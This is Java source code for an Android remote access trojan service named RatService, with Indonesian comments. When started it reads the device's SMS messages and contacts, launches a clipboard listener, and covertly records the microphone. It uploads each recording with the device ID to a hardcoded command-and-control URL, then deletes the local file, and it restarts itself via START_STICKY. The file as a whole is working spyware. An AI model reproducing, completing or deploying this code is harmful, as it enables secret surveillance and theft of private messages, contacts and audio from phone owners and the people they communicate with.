package com.example.androidrat;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;

import android.media.MediaRecorder;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import android.provider.Settings;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class RatService extends Service {

    private static final String TAG = "RatService";
    private static final String C2_UPLOAD_URL = "https://bott-production-2188.up.railway.app/rat/upload";

    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private File outputFile;
    private String deviceId;
    private OkHttpClient httpClient;


    @Override
    public void onCreate() {
        super.onCreate();
        httpClient = new OkHttpClient();
        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            Log.e(TAG, "Failed to get device ID.", e);
            deviceId = "unknown_device";
        }
        Log.d(TAG, "Service onCreate: Layanan RAT sedang dibuat untuk perangkat: " + deviceId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand: Layanan RAT dimulai.");

        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            Log.d(TAG, "Menerima intent dengan aksi: " + action);
            switch (action) {
                case "START_RECORDING":
                    recordMicrophone(); // Durasinya diatur di dalam method
                    break;
                case "FETCH_DATA":
                    // Aksi ini bisa digunakan untuk memicu pengambilan data manual dari C2
                    fetchData();
                    break;
                // Aksi lain bisa ditambahkan di sini
            }
        } else {
            // Perilaku default jika tidak ada aksi spesifik
            fetchData();
            try {
                Intent clipboardIntent = new Intent(this, ClipboardListenerService.class);
                startService(clipboardIntent);
                Log.d(TAG, "ClipboardListenerService berhasil dimulai.");
            } catch (Exception e) {
                Log.e(TAG, "Gagal memulai ClipboardListenerService", e);
            }
        }

        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (isRecording) {
            stopRecordingAndUpload();
        }
        Log.d(TAG, "Service onDestroy: Layanan RAT dihentikan.");
    }

    private void fetchData() {
        // Jalankan pengambilan data di thread terpisah agar tidak memblokir main thread
        new Thread(() -> {
            Log.d(TAG, "fetchData: Memulai pengambilan data di latar belakang...");
            try {
                // Beri jeda sedikit untuk memastikan service sudah stabil
                Thread.sleep(2000);
                getSms();
                Thread.sleep(1000);
                getContacts();
                Thread.sleep(1000);
                recordMicrophone();
            } catch (InterruptedException e) {
                Log.e(TAG, "Thread pengambilan data terganggu", e);
            }
        }).start();
    }

    private void getSms() {
        Log.d(TAG, "Mulai mengambil SMS...");
        ContentResolver contentResolver = getContentResolver();
        Uri uri = Telephony.Sms.CONTENT_URI;
        try (Cursor cursor = contentResolver.query(uri, null, null, null, "date DESC")) {
            if (cursor == null) {
                Log.e(TAG, "Gagal query SMS, cursor null.");
                return;
            }

            if (cursor.moveToFirst()) {
                Log.d(TAG, "Jumlah SMS ditemukan: " + cursor.getCount());
                int addressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY);
                int dateColumn = cursor.getColumnIndex(Telephony.Sms.DATE);
                int typeColumn = cursor.getColumnIndex(Telephony.Sms.TYPE);

                do {
                    String address = cursor.getString(addressColumn);
                    String body = cursor.getString(bodyColumn);
                    long dateMillis = cursor.getLong(dateColumn);
                    String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(dateMillis));
                    int type = cursor.getInt(typeColumn);
                    String smsType;
                    switch (type) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX: smsType = "INBOX"; break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT: smsType = "SENT"; break;
                        case Telephony.Sms.MESSAGE_TYPE_DRAFT: smsType = "DRAFT"; break;
                        default: smsType = "UNKNOWN";
                    }
                    // Log dengan format yang lebih bersih
                    Log.i("RAT_SMS_LOG", String.format("Type: %s, From: %s, Date: %s, Body: %s", smsType, address, date, body.replace("\n", " ")));
                } while (cursor.moveToNext());
            } else {
                Log.d(TAG, "Tidak ada SMS yang ditemukan.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error saat mengambil SMS", e);
        }
        Log.d(TAG, "Selesai mengambil SMS.");
    }

    private void getContacts() {
        Log.d(TAG, "Mulai mengambil Kontak...");
        ContentResolver contentResolver = getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        try (Cursor cursor = contentResolver.query(uri, null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC")) {
            if (cursor == null) {
                Log.e(TAG, "Gagal query Kontak, cursor null.");
                return;
            }

            if (cursor.moveToFirst()) {
                Log.d(TAG, "Jumlah Kontak ditemukan: " + cursor.getCount());
                int nameColumn = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberColumn = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                do {
                    String name = cursor.getString(nameColumn);
                    String number = cursor.getString(numberColumn);
                    // Log dengan format yang lebih bersih
                    Log.i("RAT_CONTACT_LOG", String.format("Name: %s, Number: %s", name, number));
                } while (cursor.moveToNext());
            } else {
                Log.d(TAG, "Tidak ada Kontak yang ditemukan.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error saat mengambil Kontak", e);
        }
        Log.d(TAG, "Selesai mengambil Kontak.");
    }

    private void recordMicrophone() {
        if (isRecording) {
            Log.d(TAG, "Perekaman sudah berjalan.");
            return;
        }

        // Simpan file ke direktori cache agar tidak menumpuk di penyimpanan utama
        outputFile = new File(getCacheDir(), "mic_record_" + System.currentTimeMillis() + ".3gp");

        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setOutputFile(outputFile.getAbsolutePath());

        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            Log.i(TAG, "Perekaman mikrofon dimulai. Menyimpan ke: " + outputFile.getAbsolutePath());

            // Rekam selama 10 detik untuk demonstrasi, kemudian berhenti dan unggah
            new Thread(() -> {
                try {
                    Thread.sleep(10000); // 10 detik
                } catch (InterruptedException e) {
                    Log.e(TAG, "Thread perekaman mikrofon terganggu", e);
                } finally {
                    // Pastikan ini dijalankan di UI thread jika perlu, tapi untuk stop() biasanya aman
                    stopRecordingAndUpload();
                }
            }).start();

        } catch (IOException | IllegalStateException e) {
            Log.e(TAG, "Gagal memulai atau mempersiapkan MediaRecorder", e);
            releaseMediaRecorder();
        }
    }

    private void stopRecordingAndUpload() {
        if (isRecording && mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                Log.i(TAG, "Perekaman mikrofon dihentikan. File siap diunggah: " + outputFile.getAbsolutePath());
                uploadFile(outputFile); // Panggil metode unggah setelah perekaman berhenti
            } catch (IllegalStateException e) {
                Log.e(TAG, "Gagal menghentikan MediaRecorder", e);
                if (outputFile != null) outputFile.delete(); // Hapus file jika gagal
            } finally {
                releaseMediaRecorder();
            }
        }
    }

    private void uploadFile(final File file) {
        if (file == null || !file.exists()) {
            Log.e(TAG, "File untuk diunggah tidak ada atau null.");
            return;
        }

        try {
            RequestBody fileBody = RequestBody.create(file, MediaType.parse("audio/3gpp"));

            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.getName(), fileBody)
                    .addFormDataPart("deviceId", deviceId)
                    .addFormDataPart("type", "mic_recording")
                    .build();

            Request request = new Request.Builder()
                    .url(C2_UPLOAD_URL)
                    .post(requestBody)
                    .build();

            Log.d(TAG, "Mengunggah file: " + file.getName() + " ke " + C2_UPLOAD_URL);

            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Gagal mengunggah file: " + file.getName(), e);
                    file.delete(); // Hapus file setelah gagal unggah
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "File berhasil diunggah: " + file.getName());
                    } else {
                        Log.e(TAG, "Gagal mengunggah file: " + file.getName() + ". Kode: " + response.code());
                        Log.e(TAG, "Respons server: " + response.body().string());
                    }
                    response.close();
                    file.delete(); // Hapus file setelah berhasil atau gagal diunggah
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error saat membuat request unggah.", e);
            file.delete(); // Hapus file jika terjadi error
        }
    }

    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            mediaRecorder.reset();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
        }
    }
}
